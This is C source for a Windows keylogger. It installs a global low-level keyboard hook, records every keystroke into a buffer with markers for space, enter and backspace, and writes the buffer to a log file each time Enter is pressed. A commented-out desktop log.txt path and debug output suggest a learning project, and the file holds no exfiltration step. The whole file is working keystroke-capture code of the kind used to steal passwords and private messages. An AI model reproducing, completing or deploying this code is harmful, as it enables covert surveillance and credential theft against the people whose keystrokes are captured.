#include "winkey.h"
#include <debugapi.h>
// add this line or add user32.lib on Makefile
//#pragma comment(lib, "user32.lib")

/*
typedef struct tagKBDLLHOOKSTRUCT {
    DWORD     vkCode;       A virtual-key code. The code must be a value in the range 1 to 254.
    DWORD     scanCode;     A hardware scan code for the key.
    DWORD     flags;        The extended-key flag, event-injected flags, context code, and transition-state flag.
    DWORD     time;         The time stamp for this message, equivalent to what GetMessageTime would return for this message.
    ULONG_PTR dwExtraInfo;  Additional information associated with the message.
} KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
*/

LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
    DWORD   kCode = 0;

    /*DWORD file = GetFileAttributes("C:\\Users\\r4mnesia\\Desktop\\log.txt");
    if (file != INVALID_FILE_ATTRIBUTES)
    {
        // openfile 
    }
    else
    {
        // create file 
    }*/

    if (wParam == WM_KEYDOWN)
    {
        switch(pkey->vkCode)
        {
            case VK_SPACE:
                input_add_string("[SPACE]");
                break ;
            case VK_RETURN:
                input_add_string("[ENTER]\\n\n");
                DBG("buffer = %s\n", input_get_buffer());
                WriteLogs(input_get_buffer());
                input_clean_buffer();
                break ;
            case VK_BACK:
                input_add_string("[BACKSPACE]");
                break ;
            default:
                kCode = pkey->vkCode;
                printf("%c", (char)pkey->vkCode);
                //DBG("OOHH\n");
                
                /*BYTE keyboard_status[256];
                WCHAR unicode_buff[8] = {0}; 
                int unicode = ToUnicode(pkey->vkCode, pkey->scanCode, keyboard_status, unicode_buff, 8, 0);
                DBG("Unicde: %d\n", unicode);
                DBG_unicode(L"%lc", unicode_buff[0]);*/

                input_add_key((char)pkey->vkCode);
                DBG("buffer = %s\n", input_get_buffer());
                //WriteLogs(input_get_buffer());
                break ;
        }
    }


    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main(void)
{
    HHOOK hhook = SetWindowsHookExA(
                            WH_KEYBOARD_LL,
                            hook_proc,
                            NULL,
                            0);

    if (!hhook)
        printf("Hook wasn't installed\n");
    OutputDebugString("Hook was installed\n");

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}